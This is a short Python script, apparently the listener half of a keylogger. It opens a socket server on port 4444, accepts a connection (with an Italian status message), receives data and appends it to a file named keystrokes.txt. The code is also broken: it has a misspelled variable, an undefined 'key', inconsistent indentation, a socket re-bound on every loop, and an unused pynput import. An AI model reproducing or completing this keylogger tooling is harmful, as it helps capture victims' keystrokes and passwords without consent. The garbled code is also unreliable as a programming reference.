from pynput import keyboard
import socket
log = []
while True:
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("127.0.0.1", 4444))
    server.listen(1)
    connection,address = server.accept()
    print(f'Connessione ricevuta da: {address}')



    data=conneciton.recv(1024)
        
    log.append(str(data))
    with open("keystrokes.txt", "a") as file:
        file.write(str(key))
  